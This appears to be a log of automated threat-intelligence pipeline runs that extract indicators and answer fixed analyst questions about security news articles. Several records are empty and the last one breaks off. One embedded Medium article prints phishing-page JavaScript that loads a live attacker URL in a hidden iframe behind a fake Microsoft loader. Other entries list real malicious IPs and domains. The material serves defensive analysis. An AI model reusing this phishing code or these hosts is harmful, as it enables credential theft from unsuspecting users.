{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://huggingface.co/blog/davidberenstein1957/phare-analysis-of-hallucination-in-leading-llms", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://huggingface.co/blog/davidberenstein1957/phare-analysis-of-hallucination-in-leading-llms", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/cisa-warns-of-suspected-broader-saas.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The attack involves exploiting app secrets and cloud misconfigurations, with threat actors accessing client secrets for Commvault's Microsoft 365 backup software-as-a-service (SaaS) solution. It also includes exploiting a zero-day vulnerability (CVE-2025-3928) in the Commvault Web Server.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals client secrets for Commvault's Microsoft 365 backup software-as-a-service solution, and app credentials that customers use to authenticate their M365 environments.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/cisa-warns-of-suspected-broader-saas.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "apt", "malicious", "botnet", "dropper"], "article_textual_content": "# CISA Warns of Suspected Broader SaaS Attacks Exploiting App Secrets and Cloud Misconfigs\n\nThe U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday revealed that Commvault is monitoring cyber threat activity targeting applications hosted in their Microsoft Azure cloud environment.\n\n\"Threat actors may have accessed client secrets for Commvault's (Metallic) Microsoft 365 (M365) backup software-as-a-service (SaaS) solution, hosted in Azure,\" the agency said.\n\n\"This provided the threat actors with unauthorized access to Commvault's customers' M365 environments that have application secrets stored by Commvault.\"\n\nCISA further noted that the activity may be part of a broader campaign targeting various software-as-a-service (SaaS) providers' cloud infrastructures with default configurations and elevated permissions.\n\nThe advisory comes weeks after Commvault revealed that Microsoft notified the company in February 2025 of unauthorized activity by a nation-state threat actor within its Azure environment.\n\nThe incident led to the discovery that the threat actors had been exploiting a zero-day vulnerability (CVE-2025-3928), an unspecified flaw in the Commvault Web Server that enables a remote, authenticated attacker to create and execute web shells.\n\n\"Based on industry experts, this threat actor uses sophisticated techniques to try to gain access to customer M365 environments,\" Commvault said in an announcement. \"This threat actor may have accessed a subset of app credentials that certain Commvault customers use to authenticate their M365 environments.\"\n\nCommvault said it has taken several remedial actions, including rotating app credentials for M365, but emphasized that there has been no unauthorized access to customer backup data.\n\nTo mitigate such threats, CISA is recommending that users and administrators follow the below guidelines -\n\n- Monitor Entra audit logs for unauthorized modifications or additions of credentials to service principals initiated by Commvault applications/service principals\n- Review Microsoft logs (Entra audit, Entra sign-in, unified audit logs) and conduct internal threat hunting\n- For single tenant apps, implement a conditional access policy that limits authentication of an application service principal to an approved IP address that is listed within Commvault's allowlisted range of IP addresses\n- Review the list of Application Registrations and Service Principals in Entra with administrative consent for higher privileges than the business need\n- Restrict access to Commvault management interfaces to trusted networks and administrative systems\n- Detect and block path-traversal attempts and suspicious file uploads by deploying a Web Application Firewall and removing external access to Commvault applications\n\nCISA, which added CVE-2025-3928 to its Known Exploited Vulnerabilities Catalog in late April 2025, said it's continuing to investigate the malicious activity in collaboration with partner organizations.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/us-dismantles-danabot-malware-network.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityboulevard.com/2025/05/u-s-authorities-seize-danabot-malware-operation-indict-16/?utm_source=rss&utm_medium=rss&utm_campaign=u-s-authorities-seize-danabot-malware-operation-indict-16", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/vicioustrap-uses-cisco-flaw-to-build.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is a honeypot-like network, specifically a shell script dubbed NetGhost, which redirects incoming traffic from compromised routers to a honeypot-like infrastructure under the attacker's control.", "question": "What kind of malware is it?"}, {"answer": "It involves an adversary-in-the-middle (AitM) attack, where the threat actor redirects network traffic from compromised systems to third-party infrastructure under their control.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, specifically the NetGhost script, allows the attacker to intercept network flows and potentially collect non-public or zero-day exploits, as well as reuse access obtained by other threat actors.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is redirected to third-party infrastructure controlled by the attacker, with traffic being sent to numerous assets in Taiwan and the United States.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include 84 countries, with a majority of the infections (850 compromised devices) located in Macau. There is no mention of specific banks, wallets, or other organizations being targeted.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/vicioustrap-uses-cisco-flaw-to-build.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "IP Address", "value": "101.99.91.151"}, {"type": "IP Address", "value": "101.99.91.239"}], "keywords_found": ["analysis", "threat", "apt", "malicious", "botnet", "dropper"], "article_textual_content": "# ViciousTrap Uses Cisco Flaw to Build Global Honeypot from 5,300 Compromised Devices\n\nCybersecurity researchers have disclosed that a threat actor codenamed ViciousTrap has compromised nearly 5,300 unique network edge devices across 84 countries and turned them into a honeypot-like network.\n\nThe threat actor has been observed exploiting a critical security flaw impacting Cisco Small Business RV016, RV042, RV042G, RV082, RV320, and RV325 Routers (CVE-2023-20118) to corral them into a set of honeypots en masse. A majority of the infections are located in Macau, with 850 compromised devices.\n\n\"The infection chain involves the execution of a shell script, dubbed NetGhost, which redirects incoming traffic from specific ports of the compromised router to a honeypot-like infrastructure under the attacker's control allowing them to intercept network flows,\" Sekoia said in an analysis published Thursday.\n\nIt's worth noting that the exploitation of CVE-2023-20118 was previously attributed by the French cybersecurity company to another botnet dubbed PolarEdge.\n\nWhile there is no evidence that these two sets of activities are connected, it's believed that the threat actor behind ViciousTrap is likely setting up honeypot infrastructure by breaching a wide range of internet-facing equipment, including SOHO routers, SSL VPNs, DVRs, and BMC controllers from more than 50 brands like Araknis Networks, ASUS, D-Link, Linksys, and QNAP.\n\n\"This setup would allow the actor to observe exploitation attempts across multiple environments and potentially collect non-public or zero-day exploits, and reuse access obtained by other threat actors,\" it added.\n\nThe attack chain entails the weaponization of CVE-2023-20118 to download and execute a bash script via ftpget, which then contacts an external server to fetch the wget binary. In the next step, the Cisco flaw is exploited a second time, using it to execute a second script retrieved using the previously dropped wget.\n\nThe second-stage shell script, internally referenced as NetGhost, is configured to redirect network traffic from the compromised system to third-party infrastructure controlled by the attacker, thereby facilitating adversary-in-the-middle (AitM) attacks. It also comes with capabilities to remove itself from the compromised host to minimize forensic trail.\n\nSekoia said all exploitation attempts have originated from a single IP address (\"101.99.91[.]151\"), with the earliest activity dating back to March 2025. In a noteworthy event observed a month later, the ViciousTrap actors are said to have repurposed an undocumented web shell previously employed in PolarEdge botnet attacks for their own operations.\n\n\"This assumption aligns with the attacker's use of NetGhost,\" security researchers Felix Aimé and Jeremy Scion said. \"The redirection mechanism effectively positions the attacker as a silent observer, capable of collecting exploitation attempts and, potentially, web shell accesses in transit.\"\n\nAs recently as this month, exploitation efforts have also targeted ASUS routers but from a different IP address (\"101.99.91[.]239\"), although the threat actors have not been found to create any honeypot on the infected devices. All the IP addresses actively used in the campaign are located in Malaysia and are part of an Autonomous System (AS45839) operated by hosting provider Shinjiru.\n\nThe actor is believed to be of Chinese-speaking origin on the basis of a weak overlap with the GobRAT infrastructure and the fact that traffic is redirected to numerous assets in Taiwan and the United States.\n\n\"The final objective of ViciousTrap remains unclear even [though] we assess with high confidence that it's a honeypot-style network,\" Sekoia concluded.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blog.lumen.com/inside-danabots-infrastructure-in-support-of-operation-endgame-ii/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.justice.gov/usao-cdca/pr/16-defendants-federally-charged-connection-danabot-malware-scheme-infected-computers", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.crowdstrike.com/en-us/blog/crowdstrike-partners-with-doj-disrupt-danabot-malware-operators/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://www.crowdstrike.com/en-us/blog/crowdstrike-partners-with-doj-disrupt-danabot-malware-operators/", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityboulevard.com/2025/05/crypto-drainers-are-targeting-cryptocurrency-users/?utm_source=rss&utm_medium=rss&utm_campaign=crypto-drainers-are-targeting-cryptocurrency-users", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://medium.com/@kumarishefu.4507/breaking-down-a-real-html-based-phishing-attack-disguised-as-a-system-loader-2ab18e616255?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing attack, specifically a modern phishing attack delivered through a deceptively clean HTML page that mimics a system loader screen.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The malicious iframe attempts to connect to an external controlled server, potentially to load credential phishing UIs, among other malicious activities.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware attempts to load credential phishing UIs, deliver drive-by downloads, and execute browser fingerprinting, potentially stealing user credentials, such as login information, and other sensitive data.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is forwarded to a remote URL inside an iframe, specifically to \"https://2v00ofca4qvi5.athena-technologies.com.my:8443/impact?\".", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://medium.com/@kumarishefu.4507/breaking-down-a-real-html-based-phishing-attack-disguised-as-a-system-loader-2ab18e616255?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://2v00ofca4qvi5.athena-technologies.com.my:8443/impact"}], "keywords_found": ["analysis", "threat", "phishing", "malicious", "browser"], "article_textual_content": "# 🎯 Breaking Down a Real HTML-Based Phishing Attack Disguised as a System Loader\n\nJust now\n\n--\n\nListen\n\nShare\n\nCybercriminals have evolved past crude login pages and email spoofs. In this blog, we’ll dissect a modern phishing attack delivered through a deceptively clean HTML page that mimics a system loader screen. This kind of threat is especially dangerous because it looks polished, professional, and benign — until you dive into the code.\n\n# 🎬 The Fake Setup: “System Initializing…”\n\nThe HTML page presents users with a Microsoft-style loading screen. Here’s the first trick: it uses a fake loader and logo to build trust and delay suspicion.\n\n# Fake Loader Preview:\n\n```\n<div id=\"initializer\">\n  <div class=\"ms-logo\"> <!-- Looks like O365 login page logo --> </div>\n  <div class=\"loader\">\n    <div class=\"progress\"></div>\n  </div>\n  <div class=\"status\">Loading ...</div>\n</div>\n```\n\nThis section appears first when the page loads and mimics a trustworthy UI to mask the malicious intent.\n\n# 🧠 JavaScript: Where the Magic (and Malice) Happens\n\nThe entire page logic is handled in an immediately invoked function expression (IIFE) that begins as soon as the script loads:\n\n```\n(function() {\n  var debug = true;\n  function log(message) {\n    if (debug) console.log('[DEBUG]', message);\n  }\n  // ...\n})();\n```\n\nA debugging flag ensures the attacker can track what happens in real-time while testing.\n\n# Key Elements Grabbed From DOM:\n\n```\nvar initScreen = doc.getElementById(\"initializer\");\nvar contentArea = doc.getElementById(\"main-content\");\nvar frameElement = doc.getElementById(\"display-frame\");\n```\n\nIf these elements aren’t found, an error message is displayed to simulate a system issue.\n\n# 🎯 The Real Goal: Loading the Malicious Iframe\n\nEverything in this code builds up to one central payload: loading a remote URL inside an iframe.\n\n# Malicious URL Loader:\n\n```\nvar targetUrl = \"https://2v00ofca4qvi5.athena-technologies.com.my:8443/impact?\" +\n  encodeURIComponent(randomParam) + \"=\" + encodeURIComponent(\"dGVzdEBjb21wYW55LmNvbQ==\");\nframeElement.src = targetUrl;\n```\n\n🔐 The string dGVzdEBjb21wYW55LmNvbQ== is Base64 for test@company.com, possibly spoofing a legit user or tracking tag.\n\nThis iframe attempts to connect to an external controlled server, potentially to:\n\n- Load credential phishing UIs\n- Deliver drive-by downloads\n- Execute browser fingerprinting\n\n# 🕵️‍♂️ Obfuscation &amp; Fallbacks\n\nAttackers use UI logic to hide malicious behavior until it’s too late:\n\n- Timeout Fallback:\n\n```\nloadTimeout = setTimeout(function() {\n  if (!fallbackTriggered) showError('Connection timeout.');\n}, 15000);\n```\n\nIf the malicious server fails, it shows a connection error to avoid suspicion.\n\n- Onload and Onerror Handlers:\n\n```\nframeElement.onload = function() { showContent(); };\nframeElement.onerror = function() { showError('Failed to load content.'); };\n```\n\n# 🧱 Detection &amp; Defense\n\n# For Users\n\n- 🔒 Never trust a standalone HTML file from an unknown source\n- 🚫 Don’t execute local HTML/JS files from email attachments\n- 🔍 Hover over any links or inspect the source for unknown domains\n\n# For Security Teams\n\n- ✅ Use browser isolation for unknown HTML documents\n- 🧪 Scan for iframe injection + encoded remote URLs\n- ⛔ Block uncommon TLDs and unknown HTTPS ports (e.g., :8443)\n\n# 🚨 Conclusion\n\nThis isn’t your average phishing site. It’s a polished, quiet, and well-engineered social engineering payload that:\n\n- Shows a fake loader\n- Loads a sandboxed iframe\n- Redirects to a remote domain\n- Masks the threat behind a clean UI\n\nModern phishing isn’t always loud. Sometimes, it whispers.\n\nStay curious. Stay cautious. And never underestimate a single .html file.\n\n# 📬 Follow Me\n\nFor more real-world phishing breakdowns, cybersecurity walk-throughs, and code deconstructions, follow my Medium profile and share this post with your security team!\n\n-by Shefali Kumari\n\nPhishing\n\nCyberattack\n\nMalware\n\nHTML\n\nMalicious Code\n\n--\n\n--\n\n## Written by Shefali Kumari\n\nLove Learning about Malware analysis, Threat hunting, Network Security and Incident Response Management professionally | https://youtube.com/channel/UCf-F-eATCU\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178239/malware/silent-ransom-group-targeting-law-firms-the-fbi-warns.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The Silent Ransom Group is linked to Ryuk and Conti ransomware attacks.", "question": "What kind of malware is it?"}, {"answer": "The Silent Ransom Group involves callback phishing and social engineering extortion tactics, including posing as IT staff in phone calls to trick employees into granting remote access.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The Silent Ransom Group steals sensitive data from law firms, taking advantage of the highly sensitive nature of legal industry data. After stealing the data, they extort victims with ransom emails threatening to sell or publish the data.", "question": "What kind of information the malware steals?"}, {"answer": "The Silent Ransom Group operates a data leak site where they threaten to sell or publish the stolen data, but they use it inconsistently and don't always follow through on their threats.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations are U.S.-based law firms. There is no mention of specific banks, wallets, or other regions being targeted.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178239/malware/silent-ransom-group-targeting-law-firms-the-fbi-warns.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://twitter.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://www.facebook.com/securityaffairs"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/mastodon/@securityaffairs"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/operation-raptor-led-to-the-arrest-of-270-dark-web-vendors-and-buyers"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/chinese-threat-actors-exploited-trimble-cityworks-flaw-to-breach-u-s-local-government-networks"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/u-s-cisa-adds-a-samsung-magicinfo-9-server-flaw-to-its-known-exploited-vulnerabilities-catalog"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/new-signal-update-stops-windows-from-capturing-user-chats"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/contact-me"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/home"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/cyber-crime"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/cyber-warfare"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/apt"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/data-breach"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/deep-web"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/digital-id"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/hacking"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/hacktivism"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/intelligence"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/internet-of-things"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/laws-and-regulations"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/malware"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/mobile"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/reports"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/security"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/social-networks"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/terrorism"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/ics-scada"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/policies"}, {"type": "Domain or URL", "value": "https://securityaffairs.co/cookie-settings"}, {"type": "Domain or URL", "value": "mailto:ppaganini@securityaffairs.co"}], 